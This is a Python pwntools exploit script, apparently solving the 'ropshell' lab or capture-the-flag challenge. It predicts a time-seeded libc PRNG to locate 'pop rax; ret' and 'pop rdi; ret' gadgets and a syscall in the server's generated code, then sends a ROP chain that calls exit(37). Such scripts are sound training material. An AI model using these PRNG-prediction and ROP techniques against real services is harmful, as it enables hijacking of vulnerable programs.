#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
import ctypes
libc = ctypes.CDLL('libc.so.6')
from pwn import *
import struct
import numpy as np

context.arch = 'amd64'
context.os = 'linux'

r = None
if 'qemu' in sys.argv[1:]:
    r = process("qemu-x86_64-static ./ropshell", shell=True)
elif 'bin' in sys.argv[1:]:
    r = process("./ropshell", shell=False)
elif 'local' in sys.argv[1:]:
    r = remote("localhost", 10494)
else:
    r = remote("up23.zoolab.org", 10494)

if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)
r.recvuntil(b'Timestamp is ')
time = int(r.recvline()[:-1])
print(time)
libc.srand(time)
r.recvuntil(b'Random bytes generated at ')
address = int(r.recvline()[:-1], 16)
r.recvline()
print(hex(address))
LEN_CODE = 10*0x10000

codeint = []
for i in range(int(LEN_CODE/4)):
    codeint.append(hex(((libc.rand()<<16) & 0xffffffff) | (libc.rand() & 0xffff)))
LEN_RAND = libc.rand() % (int(LEN_CODE/4) - 1)

index_rax = 0
index_rdi = 0

rax = asm(""" pop rax
        ret """).hex()
rdi = asm(""" pop rdi
        ret """).hex()
for i in range(int(LEN_CODE/4)):
    if("c358" == codeint[i][-4:]):
        index_rax = i * 4
        break
for i in range(int(LEN_CODE/4)):
    if("c35f" == codeint[i][-4:]):
        index_rdi = i * 4
        break

index_rax += address
index_rdi += address
index_sys = address + LEN_RAND * 4
print(hex(index_rax))
print(hex(index_rdi))
print(hex(index_sys))

str1 = p64(index_rax)
print(str1)
input1 = p64(60)

str2 = p64(index_rdi)
print(str2)
input2 = p64(37)

str3 = p64(index_sys)
print(str3)
payload = str1 + input1 + str2 + input2 + str3
# payload = str1 + input1
r.sendafter(b'> ', payload)

r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
